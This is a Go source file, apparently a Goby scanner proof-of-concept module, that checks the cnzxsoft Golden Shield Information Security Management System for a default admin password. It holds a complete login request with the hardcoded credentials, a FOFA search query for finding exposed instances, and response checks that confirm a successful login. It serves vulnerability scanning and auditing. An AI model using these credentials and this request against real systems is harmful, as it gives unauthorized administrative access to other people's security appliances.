package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "cnzxsoft information security management system default account",
    "Description": "cnzxsoft Golden Shield Information Security Management System has a default weak password.",
    "Product": "cnzxsoft-Information-Security-Management",
    "Homepage": "http://www.cnzxsoft.com",
    "DisclosureDate": "2021-04-12",
    "Author": "itardc@163.com",
    "FofaQuery": "title=\"中新金盾信息安全管理系统\"",
    "Level": "3",
    "Impact": "",
    "Recommendation": "",
    "References": [
        "http://fofa.so"
    ],
    "HasExp": false,
    "ExpParams": null,
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "data": "name=admin&password=zxsoft1234!%40%23%24&checkcode=ptbh&doLoginSubmit=1",
                "data_type": "text",
                "header": {
                    "Cookie": "check_code=ptbh",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "follow_redirect": false,
                "method": "POST",
                "uri": "/?q=common/login"
            },
            "ResponseTest": {
                "checks": [
                    {
                        "bz": "",
                        "operation": "==",
                        "type": "item",
                        "value": "200",
                        "variable": "$code"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "1",
                        "variable": "$body"
                    },
                    {
                        "bz": "",
                        "operation": "contains",
                        "type": "item",
                        "value": "ZXSOFT_JDIS_USR_NAME=deleted",
                        "variable": "$head"
                    }
                ],
                "operation": "AND",
                "type": "group"
            },
            "SetVariable": [
                "keymemo|lastbody|variable|admin:zxsoft1234!@#$",
                "vulurl|lastbody|variable|{{{scheme}}}://admin:zxsoft1234!@#$@{{{hostinfo}}}/?q=common/login"
            ]
        }
    ],
    "ExploitSteps": null,
    "Tags": [
        "defaultaccount"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "cnzxsoft-Information-Security-Management"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "6791"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
